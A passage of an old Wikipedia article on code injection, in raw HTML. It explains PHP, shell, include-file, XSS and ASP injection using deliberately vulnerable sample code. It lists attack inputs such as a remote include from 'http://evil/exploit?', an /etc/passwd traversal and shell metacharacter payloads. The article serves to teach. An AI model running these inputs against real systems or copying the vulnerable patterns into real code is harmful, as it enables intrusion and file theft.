<span class="re0">$safevar</span> = <span class="st0">"0"</span>; 
<span class="re0">$param1</span> = <span class="st0">""</span>; 
<span class="re0">$param2</span> = <span class="st0">""</span>; 
<span class="re0">$param3</span> = <span class="st0">""</span>; 
<span class="co2"># my own "register globals" for param[1,2,3] </span>
<span class="kw1">foreach</span> <span class="br0">(</span><span class="re0">$_GET</span> <span class="kw1">as</span> <span class="re0">$key</span> =&gt; <span class="re0">$value</span><span class="br0">)</span> <span class="br0">{</span> 
  <span class="re0">$$key</span> = <span class="re0">$value</span>; 
<span class="br0">}</span>
</pre></div>
<p>If the attacker provides "<code>safevar=bad</code>" in the query string, then <code>$safevar</code> will be set to the value "bad".</p>
<p><a name="Dynamic_Evaluation_Vulnerabilities_-_Dynamic_Function_Evaluation" id="Dynamic_Evaluation_Vulnerabilities_-_Dynamic_Function_Evaluation"></a></p>
<h4><span class="editsection">[<a href="/w/index.php?title=Code_injection&amp;action=edit&amp;section=14" title="Edit section: Dynamic Evaluation Vulnerabilities - Dynamic Function Evaluation">edit</a>]</span> <span class="mw-headline">Dynamic Evaluation Vulnerabilities - Dynamic Function Evaluation</span></h4>
<p>The following PHP-examples will execute a function specified by request.</p>
<div dir="ltr" style="text-align: left;">
<pre class="source-php">
<span class="re0">$myfunc</span> = <span class="re0">$_GET</span><span class="br0">[</span><span class="st0">'myfunc'</span><span class="br0">]</span>; 
<span class="re0">$myfunc</span><span class="br0">(</span><span class="br0">)</span>;
</pre></div>
<p>and:</p>
<div dir="ltr" style="text-align: left;">
<pre class="source-php">
<span class="re0">$myfunc</span> = <span class="re0">$_GET</span><span class="br0">[</span><span class="st0">'myfunc'</span><span class="br0">]</span>; 
$<span class="br0">{</span><span class="st0">"myfunc"</span><span class="br0">}</span><span class="br0">(</span><span class="br0">)</span>;
</pre></div>
<p><a name="Include_File_Injection" id="Include_File_Injection"></a></p>
<h3><span class="editsection">[<a href="/w/index.php?title=Code_injection&amp;action=edit&amp;section=15" title="Edit section: Include File Injection">edit</a>]</span> <span class="mw-headline">Include File Injection</span></h3>
<p>Consider this PHP program (which includes a file specified by request):</p>
<div dir="ltr" style="text-align: left;">
<pre class="source-php">
<span class="kw2">&lt;?php</span>
   <span class="re0">$color</span> = <span class="st0">'blue'</span>;
   <span class="kw1">if</span> <span class="br0">(</span>__isset<span class="br0">(</span> <span class="re0">$_GET</span><span class="br0">[</span><span class="st0">'COLOR'</span><span class="br0">]</span> <span class="br0">)</span> <span class="br0">)</span>
      <span class="re0">$color</span> = <span class="re0">$_GET</span><span class="br0">[</span><span class="st0">'COLOR'</span><span class="br0">]</span>;
   <span class="kw1">require</span><span class="br0">(</span> <span class="re0">$color</span> . <span class="st0">'.php'</span> <span class="br0">)</span>;
<span class="kw2">?&gt;</span>
</pre></div>
<div dir="ltr" style="text-align: left;">
<pre class="source-xml">
<span class="sc3"><span class="re1">&lt;form</span> <span class="re0">method</span>=<span class="st0">"get"</span><span class="re2">&gt;</span></span>
   <span class="sc3"><span class="re1">&lt;select</span> <span class="re0">name</span>=<span class="st0">"COLOR"</span><span class="re2">&gt;</span></span>
      <span class="sc3"><span class="re1">&lt;option</span> <span class="re0">value</span>=<span class="st0">"red"</span><span class="re2">&gt;</span></span>red<span class="sc3"><span class="re1">&lt;/option<span class="re2">&gt;</span></span></span>
      <span class="sc3"><span class="re1">&lt;option</span> <span class="re0">value</span>=<span class="st0">"blue"</span><span class="re2">&gt;</span></span>blue<span class="sc3"><span class="re1">&lt;/option<span class="re2">&gt;</span></span></span>
   <span class="sc3"><span class="re1">&lt;/select<span class="re2">&gt;</span></span></span>
   <span class="sc3"><span class="re1">&lt;input</span> <span class="re0">type</span>=<span class="st0">"submit"</span><span class="re2">&gt;</span></span>
<span class="sc3"><span class="re1">&lt;/form<span class="re2">&gt;</span></span></span>
</pre></div>
<p>The developer thought this would ensure that only blue.php and red.php could be loaded. But as anyone can easily insert arbitrary values in <code>COLOR</code>, it is possible to inject code from files:</p>
<ul>
<li><code>/vulnerable.php?COLOR=<b>http://evil/exploit?</b></code> - injects a remotely hosted file containing an exploit.</li>
<li><code>/vulnerable.php?COLOR=<b>C:\\ftp\\upload\\exploit</b></code> - Executes code from an already uploaded file called exploit.php</li>
<li><code>/vulnerable.php?COLOR=<b>../../../../../../../../etc/passwd%00</b></code> - allows an attacker to read the contents of the passwd file on a UNIX system <a href="/wiki/Directory_traversal" title="Directory traversal">directory traversal</a>.</li>
<li><code>/vulnerable.php?COLOR=<b>C:\\notes.txt%00</b></code> - example using <a href="/wiki/Null_character" title="Null character">NULL</a> <a href="/wiki/Meta_character" title="Meta character" class="mw-redirect">meta character</a> to remove the <code>.php</code> suffix, allowing access to other files than .php. (PHP setting "magic_quotes_gpc = On", which is default, would stop this attack)</li>
</ul>
<p><a name="Shell_Injection" id="Shell_Injection"></a></p>
<h3><span class="editsection">[<a href="/w/index.php?title=Code_injection&amp;action=edit&amp;section=16" title="Edit section: Shell Injection">edit</a>]</span> <span class="mw-headline">Shell Injection</span></h3>
<p>Shell Injection is named after <a href="/wiki/Unix_shell" title="Unix shell">Unix shells</a>, but applies to most systems which allows software to programmatically execute <a href="/wiki/Command_line" title="Command line" class="mw-redirect">command line</a>. Typical sources of Shell Injection is calls <code>system()</code>, <code>StartProcess()</code>, <code>java.lang.Runtime.exec()</code>, <code>System.Diagnostics.Process.Start()</code> and similar APIs.</p>
<p>Consider the following short PHP program, which runs an external program called <b>funnytext</b> to replace a word the user sent with some other word)</p>
<div dir="ltr" style="text-align: left;">
<pre class="source-php">
<span class="kw2">&lt;?php</span>
<span class="kw3">passthru</span> <span class="br0">(</span> <span class="st0">" /home/user/phpguru/funnytext "</span> 
           . <span class="re0">$_GET</span><span class="br0">[</span><span class="st0">'USER_INPUT'</span><span class="br0">]</span> <span class="br0">)</span>;
<span class="kw2">?&gt;</span>
</pre></div>
<p>This program can be injected in multiple ways:</p>
<ul>
<li><b>`command`</b> will execute <b>command</b>.</li>
<li><b>$(command)</b> will execute <b>command</b>.</li>
<li><b>; command</b> will execute <b>command</b>, and output result of command.</li>
<li><b>| command</b> will execute <b>command</b>, and output result of command.</li>
<li><b>&amp;&amp; command</b> will execute <b>command</b>, and output result of command.</li>
<li><b>|| command</b> will execute <b>command</b>, and output result of command.</li>
<li><b>&gt; /home/user/phpguru/.bashrc</b> will overwrite file <b>.bashrc</b>.</li>
<li><b>&lt; /home/user/phpguru/.bashrc</b> will send file <b>.bashrc</b> as input to <b>funnytext</b>.</li>
</ul>
<p>PHP offers <code><a href="http://www.php.net/manual/en/function.escapeshellarg.php" class="external text" title="http://www.php.net/manual/en/function.escapeshellarg.php" rel="nofollow">escapeshellarg()</a></code> and <code><a href="http://www.php.net/manual/en/function.escapeshellcmd.php" class="external text" title="http://www.php.net/manual/en/function.escapeshellcmd.php" rel="nofollow">escapeshellcmd()</a></code> to perform <b>encoding</b> before calling methods. However, it is not recommended to trust these methods to be secure - also validate/sanitize input.</p>
<p><a name="HTML.2FScript_injection_.28cross-site_scripting.29" id="HTML.2FScript_injection_.28cross-site_scripting.29"></a></p>
<h3><span class="editsection">[<a href="/w/index.php?title=Code_injection&amp;action=edit&amp;section=17" title="Edit section: HTML/Script injection (cross-site scripting)">edit</a>]</span> <span class="mw-headline">HTML/Script injection (cross-site scripting)</span></h3>
<div class="rellink noprint relarticle mainarticle">Main article: <a href="/wiki/Cross-site_scripting" title="Cross-site scripting">Cross-site scripting</a></div>
<p>HTML/Script injection is a popular subject, commonly termed "Cross-Site Scripting", or "XSS". XSS refers to an injection flaw whereby user input to a web script or something along such lines is placed into the output HTML, without being checked for HTML code or scripting.</p>
<p>The two basic types are as follows:</p>
<dl>
<dt>Active (Type 1)</dt>
<dd>This type of XSS flaw is less dangerous, as the user input is placed into a dynamically generated page. No changes are made on the server.</dd>
</dl>
<dl>
<dt>Passive (Type 2)</dt>
<dd>This type is more dangerous, as the input is written to a static page, and as such, is persistent.</dd>
</dl>
<p><a name="HTML_injection_in_IE7_via_infected_DLL" id="HTML_injection_in_IE7_via_infected_DLL"></a></p>
<h4><span class="editsection">[<a href="/w/index.php?title=Code_injection&amp;action=edit&amp;section=18" title="Edit section: HTML injection in IE7 via infected DLL">edit</a>]</span> <span class="mw-headline">HTML injection in IE7 via infected DLL</span></h4>
<p>According to an article<sup id="cite_ref-3" class="reference"><a href="#cite_note-3" title=""><span>[</span>4<span>]</span></a></sup> in UK tech site <i><a href="/wiki/The_Register" title="The Register">The Register</a></i>, HTML injection can also occur if the user has an infected DLL on their system. The article quotes Roger Thompson who claims that "the victims' browsers are, in fact, visiting the PayPal website or other intended URL, but that a dll file that attaches itself to IE is managing to read and modify the html while in transit. The article mentions a phishing attack using this attack that manages to bypass IE7 and Symantec's attempts to detect suspicious sites.</p>
<p><a name="ASP_Injection" id="ASP_Injection"></a></p>
<h3><span class="editsection">[<a href="/w/index.php?title=Code_injection&amp;action=edit&amp;section=19" title="Edit section: ASP Injection">edit</a>]</span> <span class="mw-headline">ASP Injection</span></h3>
<p>"ASP Injection", "PHP Injection" <i>etc.</i> are terms coined which refer to various types of code injection attacks which allow an attacker to supply code to the server side scripting engine. In the case of "ASP Injection", the server side scripting engine is Microsoft <a href="/wiki/Active_Server_Pages" title="Active Server Pages">Active Server Pages</a>, an add-on to Microsoft IIS.</p>
<p>In practice, ASP Injection is either the exploitation of <b>Dynamic Evaluation Vulnerabilities</b>, <b>Include File Injection</b> or similar code injection vulnerabilities.</p>
<p>Example:</p>
<div dir="ltr" style="text-align: left;">
<pre class="source-asp">
<span class="kw2">&lt;%</span>
    <span class="kw1">If</span> <span class="kw1">Not</span> IsEmpty<span class="br0">(</span><span class="kw1">Request</span><span class="br0">(</span> <span class="st0">"username"</span> <span class="br0">)</span> <span class="br0">)</span> <span class="kw1">Then</span>
        Const ForReading = <span class="nu0">1</span>, ForWriting = <span class="nu0">2</span>, ForAppending = <span class="nu0">8</span>
        <span class="kw1">Dim</span> fso, f
        <span class="kw1">Set</span> fso = <span class="kw3">CreateObject</span><span class="br0">(</span><span class="st0">"Scripting.FileSystemObject"</span><span class="br0">)</span>
        <span class="kw1">Set</span> f = fso.<span class="kw3">OpenTextFile</span><span class="br0">(</span><span class="kw1">Server</span>.<span class="kw3">MapPath</span><span class="br0">(</span> <span class="st0">"userlog.txt"</span> <span class="br0">)</span>, ForAppending, <span class="kw2">True</span><span class="br0">)</span>
        f.<span class="kw3">Write</span> <span class="kw1">Request</span><span class="br0">(</span><span class="st0">"username"</span><span class="br0">)</span> &amp; vbCrLf
        f.<span class="kw3">close</span>
        <span class="kw1">Set</span> f = <span class="kw2">nothing</span>
        <span class="kw1">Set</span> fso = <span class="kw2">Nothing</span>
        <span class="kw2">%&gt;</span>
         &lt;h1&gt;List of logged users:&lt;/h1&gt;
         &lt;pre&gt;
        <span class="kw2">&lt;%</span>
         <span class="kw1">Server</span>.<span class="kw3">Execute</span><span class="br0">(</span> <span class="st0">"userlog.txt"</span> <span class="br0">)</span>
        <span class="kw2">%&gt;</span>
         &lt;/pre&gt;
        <span class="kw2">&lt;%</span>
    <span class="kw1">Else</span>
        <span class="kw2">%&gt;</span>
         &lt;form&gt;
         &lt;input name=<span class="st0">"username"</span> /&gt;&lt;input type=<span class="st0">"submit"</span> name=<span class="st0">"submit"</span> /&gt;
         &lt;/form&gt;
        <span class="kw2">&lt;%</span>
    <span class="kw1">End</span> <span class="kw1">If</span>
<span class="kw2">%&gt;</span>
</pre></div>
<p>In this example, the user is able to insert a command instead of a username.</p>
<p><a name="Analogy" id="Analogy"></a></p>
<h3><span class="editsection">[<a href="/w/index.php?title=Code_injection&amp;action=edit&amp;section=20" title="Edit section: Analogy">edit</a>]</span> <span class="mw-headline">Analogy</span></h3>
<p>Code injection is an error in interpretation. Similar interpretation errors exist out side of the world of computer science such as the comedy routine <a href="/wiki/Who%27s_on_First%3F" title="Who's on First?">Who's on First?</a> . This conversation was properly validated by this quote:<br /></p>
<blockquote>
<p>"Not the pronoun but a player with the unlikely name of Who, is on first"</p>
</blockquote>
<p>-- <a href="/wiki/Principal_Skinner" title="Principal Skinner" class="mw-redirect">Principal Skinner</a></p>
<p><a name="See_also" id="See_also"></a></p>
<h2><span class="editsection">[<a href="/w/index.php?title=Code_injection&amp;action=edit&amp;section=21" title="Edit section: See also">edit</a>]</span> <span class="mw-headline">See also</span></h2>
<ul>
<li><a href="/wiki/Buffer_overflow" title="Buffer overflow">Buffer overflow</a></li>
<li><a href="/wiki/Debugging" title="Debugging">Debugging</a></li>
<li><a href="/wiki/Mobile_code" title="Mobile code">Mobile code</a></li>
<li><a href="/wiki/Monitoring" title="Monitoring">Monitoring</a></li>
<li><a href="/wiki/SQL_injection" title="SQL injection">SQL injection</a></li>
<li><a href="/wiki/Trojan_horse_(computing)" title="Trojan horse (computing)">Trojan horse (computing)</a></li>
</ul>
<p><a name="References" id="References"></a></p>
<h2><span class="editsection">[<a href="/w/index.php?title=Code_injection&amp;action=edit&amp;section=22" title="Edit section: References">edit</a>]</span> <span class="mw-headline">References</span></h2>
<div class="references-small">
<ol class="references">
<li id="cite_note-HopeWalther-0"><b><a href="#cite_ref-HopeWalther_0-0" title="">^</a></b> <cite style="font-style:normal" class="" id="CITEREFHopeWalther2008"><a href="/w/index.php?title=Paco_Hope&amp;action=edit&amp;redlink=1" class="new" title="Paco Hope (page does not exist)">Hope, Paco</a>; <a href="/w/index.php?title=Ben_Walther&amp;action=edit&amp;redlink=1" class="new" title="Ben Walther (page does not exist)">Walther, Ben</a> (2008), <i>Web Security Testing Cookbook</i>, O'Reilly Media, Inc., p.&#160;254, <a href="/wiki/Special:BookSources/9780596514839" class="internal">ISBN 978-0-596-51483-9</a></cite><span class="Z3988" title="ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=book&amp;rft.btitle=Web+Security+Testing+Cookbook&amp;rft.aulast=Hope&amp;rft.aufirst=Paco&amp;rft.au=Hope%2C+Paco&amp;rft.au=Walther%2C+Ben&amp;rft.date=2008&amp;rft.pages=p.%26nbsp%3B254&amp;rft.pub=O%27Reilly+Media%2C+Inc.&amp;rft.isbn=978-0-596-51483-9&amp;rfr_id=info:sid/en.wikipedia.org:Code_injection"><span style="display: none;">&#160;</span></span></li>
<li id="cite_note-1"><b><a href="#cite_ref-1" title="">^</a></b> Many file formats begin by declaring how much data they hold, along with some other values, up front. Understating the amount of data in this declaration can lead to a <a href="/wiki/Buffer_overrun" title="Buffer overrun" class="mw-redirect">buffer overrun</a> in carelessly developed software. For example, a carelessly built web browser. This often exposes a code injection vulnerability. This is the premise behind many security vulnerabilities involving files, especially image and media files.</li>
<li id="cite_note-2"><b><a href="#cite_ref-2" title="">^</a></b> <cite style="font-style:normal" class="web" id="CITEREFChristey2006"><a href="/w/index.php?title=Steven_M._Christey&amp;action=edit&amp;redlink=1" class="new" title="Steven M. Christey (page does not exist)">Christey, Steven M.</a> (2006-05-03). <a href="http://seclists.org/lists/fulldisclosure/2006/May/0035.html" class="external text" title="http://seclists.org/lists/fulldisclosure/2006/May/0035.html" rel="nofollow">"Dynamic Evaluation Vulnerabilities in PHP applications"</a> (HTML). <a href="/wiki/Insecure.org" title="Insecure.org" class="mw-redirect">Insecure.org</a><span class="printonly">. <a href="http://seclists.org/lists/fulldisclosure/2006/May/0035.html" class="external free" title="http://seclists.org/lists/fulldisclosure/2006/May/0035.html" rel="nofollow">http://seclists.org/lists/fulldisclosure/2006/May/0035.html</a></span><span class="reference-accessdate">. Retrieved on 2008-11-17</span>.</cite><span class="Z3988" title="ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=bookitem&amp;rft.btitle=Dynamic+Evaluation+Vulnerabilities+in+PHP+applications&amp;rft.atitle=&amp;rft.aulast=Christey&amp;rft.aufirst=Steven+M.&amp;rft.au=Christey%2C+Steven+M.&amp;rft.date=2006-05-03&amp;rft.pub=%5B%5BInsecure.org%5D%5D&amp;rft_id=http%3A%2F%2Fseclists.org%2Flists%2Ffulldisclosure%2F2006%2FMay%2F0035.html&amp;rfr_id=info:sid/en.wikipedia.org:Code_injection"><span style="display: none;">&#160;</span></span></li>
<li id="cite_note-3"><b><a href="#cite_ref-3" title="">^</a></b> <cite style="font-style:normal" class="web" id="CITEREFGoodin2007"><a href="/w/index.php?title=Dan_Goodin&amp;action=edit&amp;redlink=1" class="new" title="Dan Goodin (page does not exist)">Goodin, Dan</a> (2007-05-25). <a href="http://www.theregister.co.uk/2007/05/25/strange_spoofing_technique" class="external text" title="http://www.theregister.co.uk/2007/05/25/strange_spoofing_technique" rel="nofollow">"Strange spoofing technique evades anti-phishing filters, Targets include PayPal, eBay and others"</a>. <a href="/wiki/The_Register" title="The Register">The Register</a><span class="printonly">. <a href="http://www.theregister.co.uk/2007/05/25/strange_spoofing_technique" class="external free" title="http://www.theregister.co.uk/2007/05/25/strange_spoofing_technique" rel="nofollow">http://www.theregister.co.uk/2007/05/25/strange_spoofing_technique</a></span><span class="reference-accessdate">. Retrieved on 2008-11-17</span>.</cite><span class="Z3988" title="ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=bookitem&amp;rft.btitle=Strange+spoofing+technique+evades+anti-phishing+filters%2C+Targets+include+PayPal%2C+eBay+and+others&amp;rft.atitle=&amp;rft.aulast=Goodin&amp;rft.aufirst=Dan&amp;rft.au=Goodin%2C+Dan&amp;rft.date=2007-05-25&amp;rft.pub=%5B%5BThe+Register%5D%5D&amp;rft_id=http%3A%2F%2Fwww.theregister.co.uk%2F2007%2F05%2F25%2Fstrange_spoofing_technique&amp;rfr_id=info:sid/en.wikipedia.org:Code_injection"><span style="display: none;">&#160;</span></span></li>
</ol>
</div>
<p><a name="External_links" id="External_links"></a></p>
<h2><span class="editsection">[<a href="/w/index.php?title=Code_injection&amp;action=edit&amp;section=23" title="Edit section: External links">edit</a>]</span> <span class="mw-headline">External links</span></h2>
<ul>
<li>Article "<a href="http://www.codeproject.com/threads/winspy.asp" class="external text" title="http://www.codeproject.com/threads/winspy.asp" rel="nofollow">Three Ways to Inject Your Code into Another Process</a>" by <a href="/w/index.php?title=Robert_Kuster&amp;action=edit&amp;redlink=1" class="new" title="Robert Kuster (page does not exist)">Robert Kuster</a></li>
<li>Article "<a href="http://www.codeproject.com/system/inject2exe.asp" class="external text" title="http://www.codeproject.com/system/inject2exe.asp" rel="nofollow">Inject your code to a Portable Executable file</a>" by <a href="/w/index.php?title=Ashkbiz_Danehkar&amp;action=edit&amp;redlink=1" class="new" title="Ashkbiz Danehkar (page does not exist)">Ashkbiz Danehkar</a></li>
<li>Article "<a href="http://www.codeproject.com/system/inject2it.asp" class="external text" title="http://www.codeproject.com/system/inject2it.asp" rel="nofollow">Injective Code inside Import Table</a>" by <a href="/w/index.php?title=Ashkbiz_Danehkar&amp;action=edit&amp;redlink=1" class="new" title="Ashkbiz Danehkar (page does not exist)">Ashkbiz Danehkar</a></li>
<li>Article "<a href="http://chris.vandenberghe.org/publications/csse_raid2005.pdf" class="external text" title="http://chris.vandenberghe.org/publications/csse_raid2005.pdf" rel="nofollow">Defending against Injection Attacks through Context-Sensitive String Evaluation (CSSE)</a>" by <a href="/w/index.php?title=Tadeusz_Pietraszek&amp;action=edit&amp;redlink=1" class="new" title="Tadeusz Pietraszek (page does not exist)">Tadeusz Pietraszek</a> and <a href="/w/index.php?title=Chris_Vanden_Berghe&amp;action=edit&amp;redlink=1" class="new" title="Chris Vanden Berghe (page does not exist)">Chris Vanden Berghe</a></li>
<li>News article "<a href="http://www.emsisoft.com/en/kb/articles/news041104/" class="external text" title="http://www.emsisoft.com/en/kb/articles/news041104/" rel="nofollow">Flux spreads wider</a>" - First <a href="/wiki/Trojan_horse_(computing)" title="Trojan horse (computing)">Trojan horse</a> to make use of code injection to prevent detection from a <a href="/wiki/Firewall_(networking)" title="Firewall (networking)" class="mw-redirect">firewall</a></li>
<li><a href="http://www.thedailywtf.com/" class="external text" title="http://www.thedailywtf.com/" rel="nofollow">The Daily WTF</a> regularly reports real-world incidences of susceptibility to code injection in software.</li>
<li><a href="http://www.armorize.com/resources/vulnerability.php?rdChart=Chart1&amp;Keyword=code+injection&amp;dbxCategory=ALL_Category&amp;dbxYear=ALL_Year&amp;dbxLanguage=ALL_Language" class="external text" title="http://www.armorize.com/resources/vulnerability.php?rdChart=Chart1&amp;Keyword=code+injection&amp;dbxCategory=ALL_Category&amp;dbxYear=ALL_Year&amp;dbxLanguage=ALL_Language" rel="nofollow">Known code injection vulnerabilities since 2001</a> by Armorize Technologies</li>
</ul>
<p><a name="Notable_code_injection_programs" id="Notable_code_injection_programs"></a></p>
<h3><span class="editsection">[<a href="/w/index.php?title=Code_injection&amp;action=edit&amp;section=24" title="Edit section: Notable code injection programs">edit</a>]</span> <span class="mw-headline">Notable code injection programs</span></h3>
<ul>
<li><a href="http://www.nstalker.com/" class="external text" title="http://www.nstalker.com/" rel="nofollow">N-Stalker Web Application Security Scanner</a></li>
<li><a href="http://www.syhunt.com/sandcat" class="external text" title="http://www.syhunt.com/sandcat" rel="nofollow">Sandcat</a></li>
<li><a href="http://www.acunetix.com/" class="external text" title="http://www.acunetix.com/" rel="nofollow">Web Vulnerability Scanner</a></li>
<li><a href="http://www.elanize.com/" class="external text" title="http://www.elanize.com/" rel="nofollow">Maui Security Scanner</a></li>
</ul>


<!-- 
NewPP limit report
Preprocessor node count: 1742/1000000
Post-expand include size: 15478/2048000 bytes
Template argument size: 5417/2048000 bytes
Expensive parser function count: 1/500
-->

<!-- Saved in parser cache with key enwiki:pcache:idhash:1065470-0!1!0!default!!en!2 and timestamp 20090415061602 -->
<div class="printfooter">
Retrieved from "<a href="http://en.wikipedia.org/wiki/Code_injection">http://en.wikipedia.org/wiki/Code_injection</a>"</div>
			<div id='catlinks' class='catlinks'><div id="mw-normal-catlinks"><a href="/wiki/Special:Categories" title="Special:Categories">Categories</a>:&#32;<span dir='ltr'><a href="/wiki/Category:Malware" title="Category:Malware">Malware</a></span> | <span dir='ltr'><a href="/wiki/Category:Computer_security_exploits" title="Category:Computer security exploits">Computer security exploits</a></span> | <span dir='ltr'><a href="/wiki/Category:Injection_exploits" title="Category:Injection exploits">Injection exploits</a></span> | <span dir='ltr'><a href="/wiki/Category:Machine_code" title="Category:Machine code">Machine code</a></span></div><div id="mw-hidden-catlinks" class="mw-hidden-cats-hidden">Hidden categories:&#32;<span dir='ltr'><a href="/wiki/Category:Articles_needing_additional_references_from_November_2008" title="Category:Articles needing additional references from November 2008">Articles needing additional references from November 2008</a></span></div></div>			<!-- end content -->
						<div class="visualClear"></div>
		</div>
	</div>
		</div>
		<div id="column-one">
	<div id="p-cactions" class="portlet">
		<h5>Views</h5>
		<div class="pBody">
			<ul>
	
				 <li id="ca-nstab-main" class="selected"><a href="/wiki/Code_injection" title="View the content page [c]" accesskey="c">Article</a></li>
				 <li id="ca-talk"><a href="/wiki/Talk:Code_injection" title="Discussion about the content page [t]" accesskey="t">Discussion</a></li>
				 <li id="ca-edit"><a href="/w/index.php?title=Code_injection&amp;action=edit" title="You can edit this page. &#10;Please use the preview button before saving. [e]" accesskey="e">Edit this page</a></li>
				 <li id="ca-history"><a href="/w/index.php?title=Code_injection&amp;action=history" title="Past versions of this page [h]" accesskey="h">History</a></li>			</ul>
		</div>
	</div>
	<div class="portlet" id="p-personal">
		<h5>Personal tools</h5>
		<div class="pBody">
			<ul>
				<li id="pt-login"><a href="/w/index.php?title=Special:UserLogin&amp;returnto=Code_injection" title="You are encouraged to log in; however, it is not mandatory. [o]" accesskey="o">Log in / create account</a></li>
			</ul>
		</div>
	</div>
	<div class="portlet" id="p-logo">
		<a style="background-image: url(http://upload.wikimedia.org/wikipedia/en/b/bc/Wiki.png);" href="/wiki/Main_Page" title="Visit the main page [z]" accesskey="z"></a>
	</div>
	<script type="text/javascript"> if (window.isMSIE55) fixalpha(); </script>
	<div class='generated-sidebar portlet' id='p-navigation'>
		<h5>Navigation</h5>
		<div class='pBody'>
			<ul>
				<li id="n-mainpage-description"><a href="/wiki/Main_Page" title="Visit the main page [z]" accesskey="z">Main page</a></li>
				<li id="n-contents"><a href="/wiki/Portal:Contents" title="Guides to browsing Wikipedia">Contents</a></li>
				<li id="n-featuredcontent"><a href="/wiki/Portal:Featured_content" title="Featured content — the best of Wikipedia">Featured content</a></li>
				<li id="n-currentevents"><a href="/wiki/Portal:Current_events" title="Find background information on current events">Current events</a></li>
				<li id="n-randompage"><a href="/wiki/Special:Random" title="Load a random article [x]" accesskey="x">Random article</a></li>
			</ul>
		</div>
	</div>
	<div id="p-search" class="portlet">
		<h5><label for="searchInput">Search</label></h5>
		<div id="searchBody" class="pBody">
			<form action="/w/index.php" id="searchform"><div>
				<input type='hidden' name="title" value="Special:Search"/>
				<input id="searchInput" name="search" type="text" title="Search Wikipedia [f]" accesskey="f" value="" />
				<input type='submit' name="go" class="searchButton" id="searchGoButton"	value="Go" title="Go to a page with this exact name if one exists" />&nbsp;
				<input type='submit' name="fulltext" class="searchButton" id="mw-searchButton" value="Search" title="Search Wikipedia for this text" />
			</div></form>
		</div>
	</div>
	<div class='generated-sidebar portlet' id='p-interaction'>
		<h5>Interaction</h5>
		<div class='pBody'>
			<ul>
				<li id="n-aboutsite"><a href="/wiki/Wikipedia:About" title="Find out about Wikipedia">About Wikipedia</a></li>
				<li id="n-portal"><a href="/wiki/Wikipedia:Community_portal" title="About the project, what you can do, where to find things">Community portal</a></li>
				<li id="n-recentchanges"><a href="/wiki/Special:RecentChanges" title="The list of recent changes in the wiki [r]" accesskey="r">Recent changes</a></li>
				<li id="n-contact"><a href="/wiki/Wikipedia:Contact_us" title="How to contact Wikipedia">Contact Wikipedia</a></li>
				<li id="n-sitesupport"><a href="http://wikimediafoundation.org/wiki/Donate" title="Support us">Donate to Wikipedia</a></li>
				<li id="n-help"><a href="/wiki/Help:Contents" title="Guidance on how to use and edit Wikipedia">Help</a></li>
			</ul>
		</div>
	</div>
	<div class="portlet" id="p-tb">
		<h5>Toolbox</h5>
		<div class="pBody">
			<ul>
				<li id="t-whatlinkshere"><a href="/wiki/Special:WhatLinksHere/Code_injection" title="List of all English Wikipedia pages containing links to this page [j]" accesskey="j">What links here</a></li>
				<li id="t-recentchangeslinked"><a href="/wiki/Special:RecentChangesLinked/Code_injection" title="Recent changes in pages linked from this page [k]" accesskey="k">Related changes</a></li>
<li id="t-upload"><a href="/wiki/Wikipedia:Upload" title="Upload files [u]" accesskey="u">Upload file</a></li>
<li id="t-specialpages"><a href="/wiki/Special:SpecialPages" title="List of all special pages [q]" accesskey="q">Special pages</a></li>
				<li id="t-print"><a href="/w/index.php?title=Code_injection&amp;printable=yes" rel="alternate" title="Printable version of this page [p]" accesskey="p">Printable version</a></li>				<li id="t-permalink"><a href="/w/index.php?title=Code_injection&amp;oldid=281618120" title="Permanent link to this version of the page">Permanent link</a></li><li id="t-cite"><a href="/w/index.php?title=Special:Cite&amp;page=Code_injection&amp;id=281618120">Cite this page</a></li>			</ul>
		</div>
	</div>
	<div id="p-lang" class="portlet">
		<h5>Languages</h5>
		<div class="pBody">
			<ul>
				<li class="interwiki-ar"><a href="http://ar.wikipedia.org/wiki/%D8%A8%D8%B1%D9%85%D8%AC%D8%A9_%D8%A8%D8%A7%D9%84%D8%AD%D9%82%D9%86">العربية</a></li>
				<li class="interwiki-he"><a href="http://he.wikipedia.org/wiki/%D7%94%D7%96%D7%A8%D7%A7%D7%AA_%D7%A7%D7%95%D7%93">עברית</a></li>
				<li class="interwiki-fi"><a href="http://fi.wikipedia.org/wiki/Tunkeutuminen_(tietotekniikka)">Suomi</a></li>
				<li class="interwiki-zh"><a href="http://zh.wikipedia.org/wiki/%E4%BB%A3%E7%A2%BC%E6%B3%A8%E5%B0%84">中文</a></li>
			</ul>
		</div>
	</div>
		</div><!-- end of the left (by default at least) column -->
			<div class="visualClear"></div>
			<div id="footer">
				<div id="f-poweredbyico"><a href="http://www.mediawiki.org/"><img src="/skins-1.5/common/images/poweredby_mediawiki_88x31.png" alt="Powered by MediaWiki" /></a></div>
				<div id="f-copyrightico"><a href="http://wikimediafoundation.org/"><img src="/images/wikimedia-button.png" border="0" alt="Wikimedia Foundation"/></a></div>
			<ul id="f-list">
					<li id="lastmod"> This page was last modified on 4 April 2009, at 02:01 (UTC).</li>
					<li id="copyright">All text is available under the terms of the <a class='internal' href="http://en.wikipedia.org/wiki/Wikipedia:Text_of_the_GNU_Free_Documentation_License" title="Wikipedia:Text of the GNU Free Documentation License">GNU Free Documentation License</a>. (See <b><a class='internal' href="http://en.wikipedia.org/wiki/Wikipedia:Copyrights" title="Wikipedia:Copyrights">Copyrights</a></b> for details.) <br /> Wikipedia&reg; is a registered trademark of the <a href="http://www.wikimediafoundation.org">Wikimedia Foundation, Inc.</a>, a U.S. registered <a class='internal' href="http://en.wikipedia.org/wiki/501%28c%29#501.28c.29.283.29" title="501(c)(3)">501(c)(3)</a> <a href="http://wikimediafoundation.org/wiki/Deductibility_of_donations">tax-deductible</a> <a class='internal' href="http://en.wikipedia.org/wiki/Non-profit_organization" title="Non-profit organization">nonprofit</a> <a href="http://en.wikipedia.org/wiki/Charitable_organization" title="Charitable organization">charity</a>.<br /></li>
					<li id="privacy"><a href="http://wikimediafoundation.org/wiki/Privacy_policy" title="wikimedia:Privacy policy">Privacy policy</a></li>
					<li id="about"><a href="/wiki/Wikipedia:About" title="Wikipedia:About">About Wikipedia</a></li>
